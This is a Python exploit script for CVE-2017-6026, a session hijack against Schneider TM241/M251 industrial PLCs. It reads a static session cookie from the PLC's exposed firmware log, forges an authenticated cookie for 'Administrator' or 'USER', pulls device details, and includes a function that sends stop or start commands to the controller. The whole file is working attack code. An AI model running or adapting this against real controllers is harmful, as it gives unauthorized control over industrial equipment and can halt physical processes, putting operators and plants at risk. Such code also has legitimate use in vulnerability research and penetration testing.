"""Schneider TM241/M251 session hijack exploit (CVE-2017-6026).

Retrieves a static session cookie from the firmware log,
then uses it to interact with the PLC web interface.

Tested on Schneider TM241 with Firmware 4.0.2.11.
"""

from __future__ import annotations

import urllib.error
import urllib.request


def get_session_cookie(target_ip: str) -> dict | None:
    """Retrieve the session cookie from FwLog.txt.

    The cookie is the epoch time at PLC startup and remains
    static until reboot. Requires a prior login since boot.

    Args:
        target_ip: IP address of the target PLC.

    Returns:
        Dictionary with cookie_value, bootup_time,
        power_on_count, or None on failure.
    """
    url = f"http://{target_ip}/usr/Syslog/FwLog.txt"
    try:
        resp = urllib.request.urlopen(
            urllib.request.Request(url)
        ).readlines()
    except Exception as exc:
        print(f"Error fetching FwLog: {exc}")
        return None

    power_on_count = 0
    cookie_val = None
    bootup_time = None
    for line in resp:
        if b"Firmware core2" in line:
            power_on_count += 1
            cookie_val = line.split(b" ")[1].decode()
            bootup_time = (
                line.split(b"(")[1].split(b")")[0].decode()
            )

    power_on_count = power_on_count // 2

    if cookie_val is None:
        print("Error: FwLog does not contain required data.")
        return None

    return {
        "cookie_value": cookie_val,
        "bootup_time": bootup_time,
        "power_on_count": power_on_count,
    }


def get_device_info(
    target_ip: str,
    cookie_value: str,
    username: str = "Administrator",
) -> dict | None:
    """Use the hijacked session to retrieve device info.

    Tries 'Administrator' first, then 'USER' as fallback.

    Args:
        target_ip: IP of the target PLC.
        cookie_value: The hijacked session cookie.
        username: Username to try first.

    Returns:
        Dictionary with device info, or None on failure.
    """
    url = f"http://{target_ip}/plcExchange/getValues/"
    post_data = (
        b"S;100;0;136;s;s;S;2;0;24;w;d;"
        b"S;1;0;8;B;d;S;1;0;9;B;d;"
        b"S;1;0;10;B;d;S;1;0;11;B;d;"
    )

    for user in (username, "USER"):
        cookie = f"M258_LOG={user}:{cookie_value}"
        req = urllib.request.Request(
            url, post_data, headers={"Cookie": cookie}
        )
        try:
            data = urllib.request.urlopen(req).read().decode()
        except Exception:
            print(f"Auth failed for user '{user}'")
            continue

        parts = data.split(";")
        state_map = {"0": "ERROR", "1": "Stopped", "2": "Running"}
        state = state_map.get(parts[1] if len(parts) > 1 else "", "Unknown")

        result = {
            "device": data.split(" ")[0],
            "mac": data.split(";")[0].split(" ")[1][1:]
            if " " in data.split(";")[0]
            else "Unknown",
            "firmware": ".".join(parts[2:6])
            if len(parts) >= 6
            else "Unknown",
            "state": state,
            "user": user,
            "cookie": cookie_value,
        }
        print(f"SUCCESS ({user})")
        print(f"  Device:     {result['device']}")
        print(f"  MAC:        {result['mac']}")
        print(f"  Firmware:   {result['firmware']}")
        print(f"  Controller: {result['state']}")
        return result

    return None


def control_plc(
    target_ip: str,
    cookie_value: str,
    username: str,
    action: str = "stop",
) -> bool:
    """Start or stop the PLC controller via session hijack.

    Args:
        target_ip: IP of the target PLC.
        cookie_value: The hijacked session cookie value.
        username: Username for the session.
        action: "start" or "stop".

    Returns:
        True if the command was sent successfully.
    """
    cookie = f"M258_LOG={username}:{cookie_value}"
    cmd_url = f"http://{target_ip}/plcExchange/command/{action}"
    req = urllib.request.Request(
        cmd_url, headers={"Cookie": cookie}
    )
    try:
        urllib.request.urlopen(req)
        print(f"Controller {action} command sent.")
        return True
    except Exception as exc:
        print(f"Failed to {action} controller: {exc}")
        return False


def exploit(target_ip: str) -> dict | None:
    """Run the full CVE-2017-6026 session hijack exploit chain.

    Args:
        target_ip: IP of the target Schneider PLC.

    Returns:
        Device info dictionary, or None on failure.
    """
    session = get_session_cookie(target_ip)
    if not session:
        return None

    print(f"Booted {session['power_on_count']} times")
    print(
        f"Cookie: {session['cookie_value']} "
        f"({session['bootup_time']})"
    )
    print("---")

    return get_device_info(target_ip, session["cookie_value"])
